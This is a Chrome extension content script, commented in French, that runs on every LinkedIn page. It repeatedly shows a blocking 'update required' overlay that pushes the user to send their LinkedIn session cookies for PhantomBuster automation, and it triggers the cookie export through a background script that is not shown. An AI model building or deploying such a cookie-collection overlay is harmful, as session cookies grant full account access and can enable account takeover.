// Content script - Injecté sur toutes les pages LinkedIn

// État de l'overlay
let overlayVisible = false;
let isProcessing = false;
let checkInterval = null;

// Initialise l'extension au chargement de la page
async function init() {
  console.log('[654 Extension] Initialisation...');

  // Vérifie immédiatement si on doit afficher l'overlay
  const shouldShow = await checkIfNeedToShow();
  if (shouldShow) {
    createOverlay();
    showOverlay();
  }

  // Lance la vérification périodique toutes les 15 minutes
  startPeriodicCheck();

  // Écoute les messages du background
  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === 'showOverlay') {
      createOverlay();
      showOverlay();
    } else if (message.action === 'hideOverlay') {
      hideOverlay();
    }
  });

  console.log('[654 Extension] Initialisé sur LinkedIn');
}

// Vérifie si on doit afficher l'overlay
async function checkIfNeedToShow() {
  try {
    const result = await chrome.storage.local.get(['lastValidation', 'sessionValid']);

    // Si jamais envoyé, afficher
    if (!result.lastValidation) {
      console.log('[654 Extension] Jamais envoyé, affichage overlay');
      return true;
    }

    // Si invalide côté serveur, afficher
    if (result.sessionValid === false) {
      console.log('[654 Extension] Session invalide, affichage overlay');
      return true;
    }

    // Si dernière validation > 15 min, vérifier côté serveur
    const now = Date.now();
    const elapsed = now - result.lastValidation;
    if (elapsed > 15 * 60 * 1000) {
      console.log('[654 Extension] 15 min écoulées, vérification serveur...');
      const isValid = await checkServerStatus();
      return !isValid;
    }

    console.log('[654 Extension] Session valide, pas d\'overlay');
    return false;
  } catch (error) {
    console.error('[654 Extension] Erreur vérification:', error);
    return true; // En cas d'erreur, afficher par sécurité
  }
}

// Vérifie le statut côté serveur
async function checkServerStatus() {
  try {
    const response = await chrome.runtime.sendMessage({
      action: 'checkSessionStatus'
    });

    if (response && response.valid) {
      await chrome.storage.local.set({
        lastValidation: Date.now(),
        sessionValid: true
      });
      return true;
    } else {
      await chrome.storage.local.set({
        sessionValid: false
      });
      return false;
    }
  } catch (error) {
    console.error('[654 Extension] Erreur check serveur:', error);
    return false;
  }
}

// Lance la vérification périodique
function startPeriodicCheck() {
  // Vérifie toutes les 15 minutes
  if (checkInterval) {
    clearInterval(checkInterval);
  }

  checkInterval = setInterval(async () => {
    console.log('[654 Extension] Vérification périodique...');
    const shouldShow = await checkIfNeedToShow();
    if (shouldShow) {
      createOverlay();
      showOverlay();
    }
  }, 15 * 60 * 1000);

  console.log('[654 Extension] Vérification périodique activée (15 min)');
}

// Crée l'overlay fullpage (modal bloquant)
function createOverlay() {
  // Vérifie si l'overlay existe déjà
  if (document.getElementById('ext654-overlay')) {
    console.log('[654 Extension] Overlay déjà existant');
    return;
  }

  // Vérifie que le body existe
  if (!document.body) {
    console.log('[654 Extension] Body pas encore prêt, réessai dans 100ms');
    setTimeout(createOverlay, 100);
    return;
  }

  const overlay = document.createElement('div');
  overlay.id = 'ext654-overlay';
  overlay.className = 'ext654-modal-backdrop';
  overlay.style.display = 'none';

  overlay.innerHTML = `
    <div class="ext654-modal">
      <div class="ext654-modal-header">
        <h2>654 - Mise à jour requise</h2>
      </div>
      <div class="ext654-modal-body">
        <p>Pour continuer à utiliser LinkedIn avec les outils 321, veuillez envoyer vos informations de session.</p>
        <p class="ext654-modal-detail">Ceci est nécessaire pour maintenir l'accès aux données LinkedIn via PhantomBuster.</p>
      </div>
      <div class="ext654-modal-footer">
        <button id="ext654-send-button" class="ext654-button">
          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
            <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0zm-1 15l-5-5 1.41-1.41L9 12.17l5.59-5.59L16 8l-7 7z"/>
          </svg>
          <span>Envoyer mes informations</span>
        </button>
        <div id="ext654-status" class="ext654-status"></div>
      </div>
    </div>
  `;

  document.body.appendChild(overlay);
  console.log('[654 Extension] Overlay fullpage ajouté au DOM');

  // Event listener sur le bouton
  const button = document.getElementById('ext654-send-button');
  if (button) {
    button.addEventListener('click', handleSendClick);
    console.log('[654 Extension] Event listener ajouté');
  } else {
    console.error('[654 Extension] Bouton non trouvé');
  }
}

// Affiche l'overlay
function showOverlay() {
  const overlay = document.getElementById('ext654-overlay');
  if (overlay) {
    overlay.style.display = 'flex';
    overlayVisible = true;
    console.log('[654 Extension] Overlay affiché');
  }
}

// Cache l'overlay
function hideOverlay() {
  const overlay = document.getElementById('ext654-overlay');
  if (overlay) {
    overlay.style.display = 'none';
    overlayVisible = false;
    console.log('[654 Extension] Overlay caché');
  }
}

// Gère le clic sur le bouton
async function handleSendClick(e) {
  e.preventDefault();
  e.stopPropagation();

  if (isProcessing) {
    return;
  }

  isProcessing = true;
  updateButtonState('loading', 'Envoi en cours...');

  try {
    const response = await chrome.runtime.sendMessage({
      action: 'getCookiesAndSend'
    });

    if (response.success) {
      updateButtonState('success', `✓ ${response.cookiesCount} cookies envoyés`);

      // Enregistre la validation réussie
      await chrome.storage.local.set({
        lastValidation: Date.now(),
        sessionValid: true
      });

      // Cache l'overlay après 2 secondes
      setTimeout(() => {
        hideOverlay();
        resetButton();
      }, 2000);
    } else {
      updateButtonState('error', `Erreur: ${response.error}`);
      setTimeout(() => resetButton(), 5000);
    }
  } catch (error) {
    console.error('[654 Extension] Erreur:', error);
    updateButtonState('error', `Erreur: ${error.message}`);
    setTimeout(() => resetButton(), 5000);
  } finally {
    isProcessing = false;
  }
}

// Met à jour l'état visuel du bouton
function updateButtonState(state, message) {
  const button = document.getElementById('ext654-send-button');
  const status = document.getElementById('ext654-status');

  button.className = `ext654-button ext654-button-${state}`;
  button.disabled = state === 'loading';

  if (message) {
    status.textContent = message;
    status.className = `ext654-status ext654-status-${state} ext654-status-visible`;
  }
}

// Réinitialise le bouton
function resetButton() {
  const button = document.getElementById('ext654-send-button');
  const status = document.getElementById('ext654-status');

  button.className = 'ext654-button';
  button.disabled = false;
  status.className = 'ext654-status';
  status.textContent = '';
}

// Initialisation au chargement
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', init);
} else {
  init();
}
